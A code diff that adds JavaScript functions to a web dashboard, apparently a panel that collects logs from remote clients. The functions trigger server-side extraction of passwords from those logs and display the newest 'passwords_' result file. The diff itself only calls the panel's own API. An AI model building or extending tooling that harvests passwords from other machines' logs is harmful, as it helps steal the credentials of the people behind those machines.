@@ -723,6 +723,67 @@ function stopAutoRefresh() {
     }
 }
 
+// 提取密码
+async function extractPasswords() {
+    try {
+        showToast('正在提取密码...', 'success');
+        const response = await fetch('/api/extract-passwords', {
+            method: 'POST'
+        });
+        const result = await response.json();
+        if (result.success) {
+            showToast(`成功提取 ${result.count} 个密码，已保存到 ${result.file}`, 'success');
+            // 刷新日志列表，以便用户可以看到新生成的密码文件
+            refreshLogs();
+        } else {
+            showToast(`提取失败: ${result.error || '未知错误'}`, 'error');
+        }
+    } catch (e) {
+        console.error('提取密码失败:', e);
+        showToast('提取请求失败', 'error');
+    }
+}
+
+// 查看最新的密码提取结果
+async function viewLatestPasswords() {
+    try {
+        // 获取所有日志文件
+        const response = await fetch('/api/logs');
+        const logs = await response.json();
+        
+        // 筛选出密码提取结果文件
+        const passwordFiles = logs.filter(log => log.filename.startsWith('passwords_'));
+        
+        if (passwordFiles.length === 0) {
+            showToast('暂无密码提取结果', 'error');
+            return;
+        }
+        
+        // 按时间排序，获取最新的文件
+        passwordFiles.sort((a, b) => {
+            return new Date(b.uploadTime) - new Date(a.uploadTime);
+        });
+        
+        const latestFile = passwordFiles[0];
+        
+        // 查看该文件
+        // 由于密码文件保存在根目录，我们需要找到对应的客户端ID
+        // 这里简化处理，使用第一个客户端的ID
+        let clientId = null;
+        if (clients.length > 0) {
+            clientId = clients[0].id;
+        } else {
+            // 如果没有客户端，使用默认路径
+            clientId = 'default:9999';
+        }
+        
+        viewLog(clientId, latestFile.filename);
+    } catch (e) {
+        console.error('查看密码提取结果失败:', e);
+        showToast('查看失败', 'error');
+    }
+}
+
 // 页面关闭前清理定时器
 window.addEventListener('beforeunload', () => {
     isUnloading = true;
